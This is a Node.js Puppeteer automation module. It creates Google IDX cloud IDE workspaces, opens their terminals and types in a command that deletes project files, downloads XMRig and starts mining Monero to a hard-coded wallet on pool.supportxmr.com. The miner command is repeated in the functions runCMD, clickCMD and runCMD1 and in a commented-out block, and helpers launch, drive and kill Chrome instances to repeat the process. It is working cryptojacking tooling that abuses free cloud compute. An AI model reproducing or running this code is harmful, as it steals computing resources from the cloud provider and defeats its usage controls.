// monaco-dialog-modal-block
const puppeteer = require('puppeteer');
const { exec } = require('child_process');
const workerName = 'd_'

async function waitForClassToExist(page, classSelector, maxWaitTimeMs = 5 * 60 * 1000, checkIntervalMs = 10 * 1000) {
    console.log(`Starting to wait for class '${classSelector}' to appear...`);
    const startTime = Date.now();

    let classFound = false;
    while (!classFound && (Date.now() - startTime < maxWaitTimeMs)) {
        try {
            // Check if the element exists and is visible
            const element = await page.$(classSelector);
            if (element) {
                const isVisible = await page.evaluate((el) => {
                    const style = window.getComputedStyle(el);
                    return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
                }, element);

                if (isVisible) {
                    classFound = true;
                    console.log(`Found element with class '${classSelector}' after ${Math.round((Date.now() - startTime) / 1000)} seconds`);
                    return true;
                }
            }
            // Wait before checking again
            console.log(`Class '${classSelector}' not found yet, checking again in ${checkIntervalMs / 1000} seconds...`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        } catch (error) {
            console.log(`Error while checking for class: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        }
    }

    if (!classFound) {
        console.log(`Timed out waiting for class '${classSelector}' after ${maxWaitTimeMs / 1000} seconds`);
    }
    return false;
}

const runCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }
}


const clickElementInIframe = async (page, iframeSelector = 'iframe', elementSelector) => {
    try {
        // Wait for iframe to be available
        await page.waitForSelector(iframeSelector);

        // Get the iframe element
        const frameElement = await page.$(iframeSelector);
        if (!frameElement) {
            console.log('Iframe not found');
            return false;
        }

        // Get the content frame
        const frame = await frameElement.contentFrame();
        if (!frame) {
            console.log('Could not access iframe content');
            return false;
        }

        // Wait for the element in the iframe to be available
        await frame.waitForSelector(elementSelector);

        // Click the element
        await frame.click(elementSelector);
        console.log(`Successfully clicked element "${elementSelector}" inside iframe`);
        return true;
    } catch (error) {
        console.error(`Error clicking element in iframe: ${error.message}`);
        return false;
    }
}
const clickCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.waitForSelector('iframe.is-loaded');
    await page.click('iframe.is-loaded');

    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
    await page.keyboard.press('Enter');
    await new Promise(resolve => setTimeout(resolve, 1000));
}


const initConnection = async (port, name = new Date().valueOf()) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com/new/react-native');


    console.log('New tab opened in existing Chrome!');
    await page.waitForSelector('#mat-input-0');

    // Type text into the input with ID mat-input-0
    await page.type('#mat-input-0', name);


    await page.keyboard.press('Enter');
    // Wait for 2 seconds before pressing Enter
    // await page.waitForTimeout(2000); 
    await new Promise(resolve => setTimeout(resolve, 1000));

    const currentUrl = await page.url();
    console.log('Current URL path:', currentUrl);
    return page;
}

const openOldConnection = async (port) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com');

    // Wait for selector to ensure the page is loaded
    await page.waitForSelector('.main-target', { timeout: 22 * 1000 }).catch(() => {
        return { browser, page, mainTargetLinks: [] };
    });

    // Get list of <a> tags with ID/class main-target and their href values
    const mainTargetLinks = await page.evaluate(() => {
        const classElements = document.querySelectorAll('a.main-target');
        const allElements = Array.from(classElements);
        return allElements.map(el => ({ href: el.href }));
    });
    console.log('Found <a> tags with main-target:', mainTargetLinks);
    return { browser, page, mainTargetLinks };
}
const runRestartScript = (script) => {
    return new Promise((resolve, reject) => {
        exec(script, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error running restart script: ${error.message}`);
                reject(error);
            } else {
                console.log('Restart script executed successfully');
                if (stdout) console.log(`stdout: ${stdout}`);
                if (stderr) console.warn(`stderr: ${stderr}`);
                resolve();
            }
        });
    });
}
const openChrome = async (port, profile) => {
    // For macOS, no need for escape sequences in the variable itself
    // const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';

    // // When passing to exec, properly escape spaces and quotes
    // const remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir=./profile/${profile}`;


    // Windows path to Chrome
    const chromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';
     // or 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'
    const path = require('path');
    const profilePath = path.resolve( __dirname, 'profile', profile);

    const remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir="${profilePath}"`;
    console.log('remoteDebugCmd:', remoteDebugCmd);
    return new Promise((resolve, reject) => {
        console.log('Executing:', remoteDebugCmd);
        exec(remoteDebugCmd, (error) => {
            if (error) {
                console.error(`Error launching Chrome: ${error.message}`);
                reject(error);
            } else {
                console.log('Chrome launched with remote debugging');
                resolve();
            }
            console.log('Chrome launched with remote debugging');
        });
    });
}

const hoverOnElement = async (page, selector) => {
    try {
        // Wait for the element to be present in the DOM
        await page.waitForSelector(selector, { timeout: 10000 });

        // Hover on the element
        await page.hover(selector);

        console.log(`Successfully hovered on element: ${selector}`);
        return true;
    } catch (error) {
        console.error(`Error hovering on ${selector}: ${error.message}`);
        return false;
    }
};

const openTerminal = async (page) => {
    try {
        await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
        await page.waitForSelector('.monaco-highlighted-label', { timeout: 100 * 1000 });
        await page.click('.menubar-menu-button');
        await page.waitForSelector('div.menubar-menu-items-holder', { timeout: 500000 });
        await page.waitForSelector('.action-label[aria-label="Terminal"]', { timeout: 500000 });
        await page.click('.action-label[aria-label="Terminal"]');
        await page.waitForSelector('.action-label[aria-label="New Terminal"]', { timeout: 500000 });
        const child = await page.$('.action-label[aria-label="New Terminal"]');
        const parent = await child.evaluateHandle(el => el.parentElement.parentElement);
        const parentElement = parent.asElement();
        if (parentElement) {
            await parentElement.click({ delay: 100 });
        } else {
            console.error('Parent element not found or not an ElementHandle');
        }
        console.log('__________________Clicked on "New Terminal"');
        await new Promise(resolve => setTimeout(resolve, 1 * 1000));
    } catch (error) {
        console.error(`Error opening terminal: ${error.message}`);
    }
}
const runCMD1 = async (page, name) => {
    await page.waitForSelector('.xterm-link-layer', { timeout: 100 * 1000 });
    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
    await page.type('.xterm-helper-textarea', textToType);
    await page.evaluate(() => {
        const textarea = document.querySelector('.xterm-helper-textarea');
        const event = new KeyboardEvent('keydown', {
            key: 'Enter',
            code: 'Enter',
            keyCode: 13,
            which: 13,
            bubbles: true
        });
        textarea.dispatchEvent(event);
    });
    await page.focus('.xterm-helper-textarea');
    await page.keyboard.press('Enter');
    await new Promise(resolve => setTimeout(resolve, 10 * 1000));
    console.log('Pressed Enter in terminal');
}

const resetWithLink = async (page, link, name) => {
    await page.goto(link);
    await new Promise(resolve => setTimeout(resolve, 3 * 1000));
    await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
    await page.waitForSelector('.monaco-highlighted-label', { timeout: 100 * 1000 });
    //  clear the terminal
    for (let i = 0; i < 2; i++) {
        try {
            const id = `#list_id_1_${0}`;
            await hoverOnElement(page, id);
            await page.waitForSelector(`${id} li:nth-of-type(2)`, { timeout: 500 });
            await page.click(`${id} li:nth-of-type(2)`);
        } catch (error) {
            console.error(`Error clicking on element: ${error.message}`);
        }
    }
    await openTerminal(page);
    await runCMD1(page, name);

    // const commands = [
    //     "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
    //     " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
    //     " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
    //     " && cd xmrig-6.22.2",
    //     " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    // ];

    // for (const cmd of commands) {
    //     await new Promise(resolve => setTimeout(resolve, 100));
    //     // await page.keyboard.type(cmd);
    //     await page.type('.xterm-helper-textarea', cmd);
    //     // Small delay between chunks to ensure proper typing
    // }

    // await page.evaluate(() => {
    //     const textarea = document.querySelector('.xterm-helper-textarea');
    //     const event = new KeyboardEvent('keydown', {
    //         key: 'Enter',
    //         code: 'Enter',
    //         keyCode: 13,
    //         which: 13,
    //         bubbles: true
    //     });
    //     textarea.dispatchEvent(event);
    // });

    // await new Promise(resolve => setTimeout(resolve, 2 * 1000));
}



const killChromeProcess = (name) => {
    const command = `ps aux | grep 'Google Chrome' | grep '${name}' | awk '{print $2}' | xargs kill -9`;

    console.log(`Executing: ${command}`);

    return new Promise((rej, res) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing command: ${error.message}`);
                rej(error);
            }
            if (stderr) {
                console.error(`Command stderr: ${stderr}`);
            }

            console.log(`Chrome processes with ${name} terminated successfully.`);
            if (stdout.trim()) {
                console.log(`Process output: ${stdout.trim()}`);
            } else {
                console.log('No matching processes found to kill.');
            }
            res();
        });
    })
};
const closeAllTabs = async (browser, saveOne = false) => {
    try {
        // Get all pages (tabs) in the browser
        const all = await browser.pages();
        all.reverse();
        const [first, ...pages] = all;
        console.log(`Closing ${pages.length} tabs...`);
        if (!saveOne) {
            await first.close().catch();
        }
        // Close each page
        for (const page of pages) {
            await page.close().catch(err => {
                console.log(`Error closing tab: ${err.message}`);
            });
        }

        console.log('All tabs closed successfully');
        return true;
    } catch (error) {
        console.error(`Error closing tabs: ${error.message}`);
        return false;
    }
};
module.exports = {
    openChrome,
    initConnection,
    runCMD,
    waitForClassToExist,
    openOldConnection,
    clickCMD,
    runRestartScript,
    resetWithLink,
    killChromeProcess,
    closeAllTabs
}
